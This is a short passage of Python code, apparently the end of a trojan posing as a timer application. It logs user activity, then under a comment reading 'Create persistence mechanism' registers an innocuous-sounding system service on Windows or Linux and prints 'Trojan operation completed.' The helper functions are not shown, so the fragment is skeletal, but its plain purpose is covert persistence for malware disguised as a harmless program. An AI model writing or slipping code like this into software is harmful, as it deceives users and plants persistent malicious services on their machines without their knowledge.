    # Log usage pattern
    log_usage("User started timer application")

    # Create persistence mechanism
    if platform.system() == 'Windows':
        create_service('TimerService')
    elif platform.system() == 'Linux':
        create_service('timer')

    print("Trojan operation completed.")
